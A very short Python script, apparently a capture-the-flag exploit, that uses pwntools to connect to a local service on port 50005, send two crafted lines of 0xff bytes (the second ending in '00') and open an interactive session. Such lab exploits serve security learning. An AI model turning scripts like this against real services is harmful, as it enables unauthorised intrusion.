from pwn import *

r = remote('localhost', 50005)

r.sendline(b'ff'*64)
r.sendline(b'ff'*64 + b'00')
r.interactive()